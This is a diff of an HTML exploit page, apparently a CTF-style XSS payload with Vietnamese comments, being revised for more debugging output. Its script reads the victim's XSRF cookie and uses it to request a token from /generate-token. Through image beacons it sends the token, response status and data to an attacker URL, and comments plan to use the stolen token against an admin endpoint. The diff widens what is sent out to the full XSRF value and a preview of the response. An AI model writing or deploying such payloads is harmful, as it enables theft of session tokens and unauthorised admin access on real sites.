@@ -13,7 +13,14 @@
             function sendPing(data) {
                 var params = new URLSearchParams();
                 params.append("source_tag", "name:description_GEN_TOKEN_V1");
-                for (var key in data) { params.append(key, String(data[key]).substring(0,500)); } // Stringify và cắt bớt
+                for (var key in data) { 
+                    let val_str = String(data[key]); // Chuyển thành string
+                    if (key === "xsrf_val" && val_str.length > 100) { // Chỉ gửi 1 phần xsrf_val nếu quá dài
+                        params.append(key, val_str.substring(0,20) + "...");
+                    } else {
+                        params.append(key, val_str.substring(0,500)); // Giới hạn độ dài chung
+                    }
+                }
                 new Image().src = attacker_url + "?" + params.toString();
             }
 
@@ -29,49 +36,68 @@
                 }
             } catch (e_cookie) {
                 sendPing({ stage: "cookie_parse_error", error: e_cookie.message });
+                return; // Dừng nếu lỗi parse cookie
             }
 
             if (!xsrfTokenValue) {
-                sendPing({ stage: "xsrf_token_missing", loc: loc });
+                sendPing({ stage: "xsrf_token_missing_stop", loc: loc }); // Thêm _stop để biết nó dừng ở đây
                 return; 
             }
             
-            sendPing({ stage: "script_start_gen_token", loc: loc, xsrf_val: xsrfTokenValue.substring(0,20) + "..." });
+            // Gửi tín hiệu ngay trước khi fetch
+            sendPing({ stage: "script_start_gen_token_BEFORE_FETCH", loc: loc, xsrf_val: xsrfTokenValue }); 
 
             fetch("/generate-token", {
                 method: "POST",
                 headers: {
                     "Accept": "application/json",
                     "X-Requested-With": "XMLHttpRequest",
-                    "X-XSRF-TOKEN": xsrfTokenValue
+                    "X-XSRF-TOKEN": xsrfTokenValue // Gửi tường minh
                 }
             })
             .then(response => {
                 var status = response.status;
                 var ok = response.ok;
-                // Để đọc body, phải clone nếu muốn log cả status và body khi có lỗi
                 var clonedResponse = response.clone(); 
+                
+                // Gửi tín hiệu ngay khi có response, trước khi đọc body
+                sendPing({ stage: "generate_token_raw_response_received", status: status, ok: ok });
+
                 if (!ok) {
                     return clonedResponse.text().then(text => {
-                        sendPing({ stage: "generate_token_fail_resp", status: status, ok: ok, body_preview: text });
-                        throw new Error("GenTokenFail: " + status); // Ném lỗi để catch xử lý
+                        // Gửi thông tin lỗi chi tiết hơn
+                        sendPing({ 
+                            stage: "generate_token_fail_resp_BODY", 
+                            status: status, 
+                            ok: ok, 
+                            body_preview: text || "empty_body" // Xử lý text rỗng
+                        });
+                        throw new Error("GenTokenFailStatus: " + status + " Body: " + (text || "empty_body"));
                     });
                 }
-                return response.json(); // Chỉ parse json nếu ok
+                return response.json(); 
             })
             .then(data => {
-                sendPing({ stage: "generate_token_success", token_prefix: data.token ? data.token.substring(0,10)+"..." : "no_token_field", user_name: data.user ? data.user.name : "no_user" });
-                // Ở đây, nếu thành công, bạn sẽ có data.token
-                // Bước tiếp theo là dùng data.token để gọi /api/admin/sup3rs3cr3t
-                // (Sẽ thêm vào Cải tiến Bước 3)
+                sendPing({ 
+                    stage: "generate_token_success_DATA", // Thêm DATA để phân biệt
+                    token_prefix: data.token ? data.token.substring(0,10)+"..." : "no_token_field_in_data", 
+                    user_name: data.user ? data.user.name : "no_user_in_data",
+                    full_data_preview: JSON.stringify(data).substring(0,200) // Preview full data
+                });
+                // Nếu thành công, data.token sẽ ở đây.
+                // Bước tiếp theo sẽ được thêm vào nếu bước này OK.
             })
             .catch(error => {
-                sendPing({ stage: "generate_token_catch_error", error_msg: error.message, error_str: error.toString() });
+                sendPing({ 
+                    stage: "generate_token_CATCH_ERROR", // Thêm CATCH để phân biệt
+                    error_msg: error.message, 
+                    error_str: error.toString().substring(0,200) // Cắt bớt error string
+                });
             });
         })();
     </script>'>
 </head>
 <body>
-    <h1>Generate Token Payload Page</h1>
+    <h1>Generate Token Payload Page - More Debug</h1>
 </body>
 </html>
